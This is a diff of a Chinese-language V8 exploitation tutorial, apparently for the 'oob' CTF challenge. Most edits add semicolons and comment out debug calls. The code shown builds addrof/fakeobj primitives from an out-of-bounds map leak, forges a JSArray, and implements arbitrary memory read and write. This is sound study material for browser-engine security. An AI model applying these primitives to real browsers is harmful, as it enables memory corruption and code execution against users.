@@ -79,8 +79,8 @@ V8 中的 JS 对象结构基本符合下面描述：
 - 测试代码：
 
 ```javascript
-let float_list = [4.3]
-%DebugPrint(float_list)
+let float_list = [4.3];
+%DebugPrint(float_list);
 ```
 
 - 输出：
@@ -317,57 +317,61 @@ ninja -C out.gn/x64.release d8
 ```javascript
 class Helpers {
   constructor() {
-    this.buf = new ArrayBuffer(8)
-    this.f64 = new Float64Array(this.buf)
-    this.f32 = new Float32Array(this.buf)
-    this.u32 = new Uint32Array(this.buf)
-    this.u64 = new BigUint64Array(this.buf)
-    this.state = {}
+    this.buf = new ArrayBuffer(8);
+    this.f64 = new Float64Array(this.buf);
+    this.f32 = new Float32Array(this.buf);
+    this.u32 = new Uint32Array(this.buf);
+    this.u64 = new BigUint64Array(this.buf);
+    this.state = {};
   }
 
   ftoil(f) {
-    this.f64[0] = f
-    return this.u32[0]
+    this.f64[0] = f;
+    return this.u32[0];
   }
 
   ftoih(f) {
-    this.f64[0] = f
-    return this.u32[1]
+    this.f64[0] = f;
+    return this.u32[1];
   }
 
   itof(i) {
-    this.u32[0] = i
-    return this.f32[0]
+    this.u32[0] = i;
+    return this.f32[0];
   }
 
   f64toi64(f) {
-    this.f64[0] = f
-    return this.u64[0]
+    this.f64[0] = f;
+    return this.u64[0];
   }
 
   i64tof64(i) {
-    this.u64[0] = i
-    return this.f64[0]
+    this.u64[0] = i;
+    return this.f64[0];
   }
 
   clean() {
-    this.state.fake_object.fill(0)
+    this.state.fake_object.fill(0);
+  }
+
+  hex(x) {
+    return x.toString(16).padStart(16, "0");
   }
 
   printhex(val) {
-    console.log("0x" + val.toString(16))
+    console.log("0x" + val.toString(16));
   }
 
   add_ref(object) {
-    this.state[this.i++] = object
+    this.state[this.i++] = object;
   }
 
   gc() {
-    new ArrayBuffer(0x7fe00000)
-    new ArrayBuffer(0x7fe00000)
-    new ArrayBuffer(0x7fe00000)
-    new ArrayBuffer(0x7fe00000)
-    new ArrayBuffer(0x7fe00000)
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
   }
 }
 ```
@@ -388,38 +392,38 @@ class Helpers {
 因此就可以构造出如下 poc：
 
 ```javascript
-let helper = new Helpers()
+let helper = new Helpers();
 
-console.log("STEP 0 - Leak maps with oob access.")
+console.log("STEP 0 - Leak maps with oob access.");
 
-let obj = {}
-let obj_list = [obj]
-let float_list = [4.3]
+let obj = {};
+let obj_list = [obj];
+let float_list = [4.3];
 
-%DebugPrint(obj_list)
-%DebugPrint(float_list)
+// %DebugPrint(obj_list);
+// %DebugPrint(float_list);
 
-let obj_list_map = obj_list.oob()
-let float_list_map = float_list.oob()
+let obj_list_map = obj_list.oob();
+let float_list_map = float_list.oob();
 
-%SystemBreak()
+// %SystemBreak();
 
-console.log("STEP 1 - Type confusion.")
+console.log("STEP 1 - Type confusion.");
 
 function get_addr(victim) {
-  obj_list[0] = victim
-  obj_list.oob(float_list_map)
-  let res = helper.f64toi64(obj_list[0]) - 1n
-  obj_list.oob(obj_list_map)
-  return res
+  obj_list[0] = victim;
+  obj_list.oob(float_list_map);
+  let res = helper.f64toi64(obj_list[0]) - 1n;
+  obj_list.oob(obj_list_map);
+  return res;
 }
 
 function get_obj(addr) {
-  float_list[0] = helper.i64tof64(addr | 1n)
-  float_list.oob(obj_list_map)
-  let res = float_list[0]
-  float_list.oob(float_list_map)
-  return res
+  float_list[0] = helper.i64tof64(addr | 1n);
+  float_list.oob(obj_list_map);
+  let res = float_list[0];
+  float_list.oob(float_list_map);
+  return res;
 }
 
 let evil_float_array = [
@@ -429,32 +433,39 @@ let evil_float_array = [
   helper.i64tof64((0x80n << 32n) | 0n),
   helper.i64tof64(0xdeadcafen),
   helper.i64tof64(0x31337n),
-]
+];
 
-let fake_array_addr = get_addr(evil_float_array)
-let fake_elements_addr = fake_array_addr + 0x30n
-let fake_obj = get_obj(fake_elements_addr)
+let fake_array_addr = get_addr(evil_float_array);
+let fake_elements_addr = fake_array_addr + 0x30n;
+let fake_obj = get_obj(fake_elements_addr);
+console.log(fake_obj.length);
 
-%DebugPrint(evil_float_array)
-%DebugPrint(fake_obj)
-%SystemBreak()
+// %DebugPrint(evil_float_array);
+// %DebugPrint(fake_obj);
+// %SystemBreak();
 ```
 
 可以验证在输出 `fake_obj` 时显示为 `<JSArray[128]>` 类型，进一步就可以在 `fake_obj` 的基础上获得任意地址读写的能力：
 
 ```javascript
-console.log("STEP 2 - Arbitary read and write with fake_obj.")
+console.log("STEP 2 - Arbitary read and write with fake_obj.");
 
 function arb_write(addr, data) {
-  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n)
-  fake_obj[0] = helper.i64tof64(data)
-  console.log("[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr))
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
+  fake_obj[0] = helper.i64tof64(data);
+  console.log(
+    "[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr),
+  );
 }
 
 function arb_read(addr) {
-  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n)
-  return helper.f64toi64(fake_obj[0])
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
+  return helper.f64toi64(fake_obj[0]);
 }
+
+let data_buf = new ArrayBuffer(0x1000);
+let data_view = new DataView(data_buf);
+let buf_backing_store_addr = get_addr(data_buf) + 0x20n;
 ```
 
 但是上面使用 FloatArray 进行写入的时候，在目标地址高位是 0x7f 等情况下，会出现低 18 位被置零的现象，可以通过 ArrayBuffer 的利用来解决（这也是绕过没有沙盒的指针压缩的常见思路，因为 ArrayBuffer 的储存空间使用 [PartitionAlloc](https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md) 分配，位于 v8 堆之外的单独内存区域中）：
@@ -468,15 +479,9 @@ function arb_read(addr) {
 改进如下:
 
 ```javascript
-let data_buf = new ArrayBuffer(8)
-let data_view = new DataView(data_buf)
-let buf_backing_store_addr = get_addr(data_buf) + 0x20n
-
-function arb_write64(addr, data) {
-  arb_write(buf_backing_store_addr, addr)
-  data_view.setBigUint64(0, data, true)
-  console.log("[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr))
-}
+let data_buf = new ArrayBuffer(0x1000);
+let data_view = new DataView(data_buf);
+let buf_backing_store_addr = get_addr(data_buf) + 0x20n;
 ```
 
 现在获得了任意地址读写，最直接的思路就是：
